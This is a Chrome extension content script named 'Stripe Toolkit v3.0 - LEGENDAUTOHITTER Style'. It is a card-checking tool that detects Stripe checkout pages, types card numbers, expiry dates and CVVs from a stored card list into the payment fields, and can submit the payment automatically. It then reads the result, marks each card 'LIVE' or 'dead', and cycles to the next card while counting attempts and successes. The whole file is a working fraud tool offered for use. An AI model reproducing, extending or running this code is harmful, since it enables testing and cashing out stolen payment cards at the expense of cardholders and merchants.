// Stripe Toolkit v3.0 - LEGENDAUTOHITTER Style
// Content Script with Floating Panel, Toast Notifications, Auto-Detect

let isCheckoutDetected = false;
let currentCard = null;
let isAutoFilling = false;
let settings = {};
let floatingPanel = null;
let checkoutBadge = null;
let cardsTried = 0;
let successCount = 0;

// Initialize
(async function init() {
    console.log('[Stripe Toolkit] Initializing...');
    
    const data = await chrome.storage.local.get(['settings', 'cards', 'currentCardIndex']);
    settings = data.settings || {};
    
    injectFloatingPanel();
    detectCheckoutPage();
    observeUrlChanges();
    
    chrome.runtime.onMessage.addListener(handleMessage);
})();

function detectCheckoutPage() {
    const url = window.location.href;
    const isStripeCheckout = url.includes('checkout.stripe.com') || 
                            url.includes('cs_live_') || 
                            url.includes('cs_test_') ||
                            url.includes('stripe.com/pay');
    
    if (isStripeCheckout && !isCheckoutDetected) {
        isCheckoutDetected = true;
        showCheckoutBadge();
        showToast('Stripe Checkout Detected', 'info');
        
        chrome.runtime.sendMessage({
            type: 'checkoutDetected',
            url: url,
            timestamp: new Date().toISOString()
        });
        
        setTimeout(() => {
            if (settings.autoFill) {
                requestCardToFill();
            }
        }, 2000);
    }
}

function showCheckoutBadge() {
    if (checkoutBadge) return;
    
    checkoutBadge = document.createElement('div');
    checkoutBadge.innerHTML = `
        <div style="position:fixed;top:200px;left:10px;background:#1a1a2e;color:#4ecca3;padding:8px 16px;border-radius:20px;font-family:Arial;font-size:13px;font-weight:bold;z-index:999999;box-shadow:0 4px 12px rgba(0,0,0,0.3);display:flex;align-items:center;gap:8px;">
            <span style="color:#4ecca3;">✓</span>2D Checkout Detected
        </div>
    `;
    document.body.appendChild(checkoutBadge);
}

function injectFloatingPanel() {
    if (floatingPanel) return;
    
    floatingPanel = document.createElement('div');
    floatingPanel.innerHTML = `
        <div style="position:fixed;bottom:20px;left:20px;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:12px 20px;border-radius:12px;font-family:'Segoe UI',Arial;font-size:12px;z-index:999998;box-shadow:0 8px 24px rgba(0,0,0,0.4);border:1px solid rgba(78,204,163,0.3);min-width:180px;">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
                <span style="font-weight:bold;color:#f39c12;font-size:13px;">Stripe Toolkit</span>
                <span style="font-size:10px;color:#95a5a6;">V3</span>
            </div>
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;">
                <div style="width:8px;height:8px;border-radius:50%;background:#4ecca3;box-shadow:0 0 8px #4ecca3;"></div>
                <span style="color:#4ecca3;font-size:11px;">Active</span>
            </div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;border-top:1px solid rgba(255,255,255,0.1);">
                <span style="color:#95a5a6;font-size:11px;">Cards Tried:</span>
                <span id="cards-tried" style="color:#fff;font-weight:bold;">0</span>
            </div>
            <div style="display:flex;justify-content:space-between;padding:6px 0;">
                <span style="color:#95a5a6;font-size:11px;">Success:</span>
                <span id="success-count" style="color:#4ecca3;font-weight:bold;">0</span>
            </div>
        </div>
    `;
    document.body.appendChild(floatingPanel);
}

function showToast(message, type = 'info') {
    document.querySelectorAll('.stripe-toolkit-toast').forEach(t => t.remove());
    
    const colors = {
        info: { bg: '#3498db', icon: 'ℹ️' },
        error: { bg: '#e74c3c', icon: '❌' },
        success: { bg: '#4ecca3', icon: '✓' },
        warning: { bg: '#f39c12', icon: '⚠️' }
    };
    
    const color = colors[type] || colors.info;
    
    const toast = document.createElement('div');
    toast.className = 'stripe-toolkit-toast';
    toast.innerHTML = `
        <div style="position:fixed;top:200px;right:20px;background:${color.bg};color:#fff;padding:12px 20px;border-radius:8px;font-family:Arial;font-size:13px;z-index:999999;box-shadow:0 4px 16px rgba(0,0,0,0.3);display:flex;align-items:center;gap:10px;">
            <span style="font-size:16px;">${color.icon}</span>
            <span>${message}</span>
        </div>
    `;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.transition = 'opacity 0.3s';
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function updateFloatingPanel(tried, success) {
    const triedEl = document.getElementById('cards-tried');
    const successEl = document.getElementById('success-count');
    
    if (triedEl) triedEl.textContent = tried;
    if (successEl) successEl.textContent = success;
}

async function requestCardToFill() {
    const data = await chrome.storage.local.get(['cards', 'currentCardIndex']);
    const cards = data.cards || [];
    const index = data.currentCardIndex || 0;
    
    if (cards.length === 0) {
        showToast('No cards available', 'error');
        return;
    }
    
    if (index >= cards.length) {
        showToast('Card List Ended', 'error');
        return;
    }
    
    currentCard = cards[index];
    cardsTried++;
    updateFloatingPanel(cardsTried, successCount);
    
    showToast(`Trying Card: ${currentCard.number.slice(0,4)}****${currentCard.number.slice(-4)}`, 'info');
    showToast(`Attempt: ${cardsTried}`, 'info');
    
    await fillCard(currentCard);
}

async function fillCard(card) {
    if (!card || isAutoFilling) return;
    
    isAutoFilling = true;
    
    try {
        await new Promise(r => setTimeout(r, 500));
        
        const cardFields = findCardFields();
        
        if (cardFields.number) {
            await typeInField(cardFields.number, card.number);
        }
        
        if (cardFields.expiry) {
            await typeInField(cardFields.expiry, `${card.expMonth}/${card.expYear.slice(-2)}`);
        } else {
            if (cardFields.expMonth) await typeInField(cardFields.expMonth, card.expMonth);
            if (cardFields.expYear) await typeInField(cardFields.expYear, card.expYear.slice(-2));
        }
        
        if (cardFields.cvv) {
            await typeInField(cardFields.cvv, card.cvv);
        }
        
        const nameField = document.querySelector('input[name="name"], input[autocomplete="cc-name"]');
        if (nameField && settings.billingName) {
            await typeInField(nameField, settings.billingName);
        }
        
        if (settings.autoSubmit) {
            await new Promise(r => setTimeout(r, 1000));
            const submitBtn = findSubmitButton();
            if (submitBtn) {
                submitBtn.click();
                showToast('Processing...', 'info');
                setTimeout(() => detectPaymentResult(), 3000);
            }
        }
        
    } catch (error) {
        console.error('[Stripe Toolkit] Fill error:', error);
        showToast('Error filling card', 'error');
    } finally {
        isAutoFilling = false;
    }
}

function findCardFields() {
    const fields = { number: null, expiry: null, expMonth: null, expYear: null, cvv: null };
    
    const iframes = document.querySelectorAll('iframe[name^="__privateStripeFrame"]');
    if (iframes.length > 0) {
        iframes.forEach(iframe => {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                const input = iframeDoc.querySelector('input');
                
                if (input) {
                    const name = input.name || input.id || '';
                    if (name.includes('cardnumber') || name.includes('number')) fields.number = input;
                    else if (name.includes('exp') && !name.includes('cvc')) fields.expiry = input;
                    else if (name.includes('cvc') || name.includes('cvv')) fields.cvv = input;
                }
            } catch (e) {}
        });
    }
    
    if (!fields.number) fields.number = document.querySelector('input[name="cardnumber"], input[autocomplete="cc-number"]');
    if (!fields.expiry) fields.expiry = document.querySelector('input[name="exp-date"], input[placeholder*="MM / YY" i]');
    if (!fields.expMonth) fields.expMonth = document.querySelector('input[name="exp-month"], input[autocomplete="cc-exp-month"]');
    if (!fields.expYear) fields.expYear = document.querySelector('input[name="exp-year"], input[autocomplete="cc-exp-year"]');
    if (!fields.cvv) fields.cvv = document.querySelector('input[name="cvc"], input[name="cvv"], input[autocomplete="cc-csc"]');
    
    return fields;
}

async function typeInField(field, value) {
    if (!field) return;
    
    field.focus();
    field.value = '';
    
    for (let char of value) {
        field.value += char;
        field.dispatchEvent(new Event('input', { bubbles: true }));
        field.dispatchEvent(new Event('change', { bubbles: true }));
        await new Promise(r => setTimeout(r, 50));
    }
    
    field.blur();
}

function findSubmitButton() {
    const selectors = ['button[type="submit"]', '.SubmitButton', '#submitButton'];
    
    for (let selector of selectors) {
        const btn = document.querySelector(selector);
        if (btn && btn.offsetParent !== null) return btn;
    }
    
    return null;
}

function detectPaymentResult() {
    const url = window.location.href;
    const body = document.body.innerText.toLowerCase();
    
    if (url.includes('success') || body.includes('payment successful') || body.includes('thank you')) {
        handlePaymentResult(true, 'Payment Successful');
        return;
    }
    
    const errorEl = document.querySelector('.Error, .error-message, [role="alert"]');
    if (errorEl && errorEl.offsetParent !== null) {
        handlePaymentResult(false, errorEl.innerText || 'Payment Declined');
        return;
    }
    
    if (body.includes('declined') || body.includes('failed') || body.includes('error')) {
        handlePaymentResult(false, 'Payment Declined');
        return;
    }
}

function handlePaymentResult(success, message) {
    if (success) {
        successCount++;
        updateFloatingPanel(cardsTried, successCount);
        showToast('LIVE CARD! ✓', 'success');
        
        chrome.runtime.sendMessage({
            type: 'cardResult',
            result: { success: true, status: 'live', card: currentCard, message: message }
        });
    } else {
        showToast(`Payment Declined: ${message}`, 'error');
        
        chrome.runtime.sendMessage({
            type: 'cardResult',
            result: { success: false, status: 'dead', card: currentCard, error: message }
        });
    }
    
    if (settings.autoNext) {
        setTimeout(() => {
            chrome.runtime.sendMessage({ type: 'nextCard' });
            setTimeout(() => requestCardToFill(), 2000);
        }, 2000);
    }
}

function observeUrlChanges() {
    let lastUrl = window.location.href;
    
    new MutationObserver(() => {
        const currentUrl = window.location.href;
        if (currentUrl !== lastUrl) {
            lastUrl = currentUrl;
            detectCheckoutPage();
        }
    }).observe(document, { subtree: true, childList: true });
}

function handleMessage(message, sender, sendResponse) {
    switch (message.type || message.action) {
        case 'fillCard':
            fillCard(message.card);
            sendResponse({ success: true });
            break;
        case 'getCheckoutInfo':
            sendResponse({
                url: window.location.href,
                sessionId: window.location.href.match(/cs_(live|test)_[a-zA-Z0-9]+/)?.[0] || '-',
                amount: document.querySelector('[class*="amount"]')?.innerText || '-',
                merchant: document.querySelector('[class*="merchant"]')?.innerText || '-'
            });
            break;
        case 'submit':
            const btn = findSubmitButton();
            if (btn) btn.click();
            sendResponse({ success: true });
            break;
        case 'settingsUpdated':
            settings = message.settings;
            break;
        case 'startChecking':
            requestCardToFill();
            break;
    }
    
    return true;
}

console.log('[Stripe Toolkit] Content script initialized');
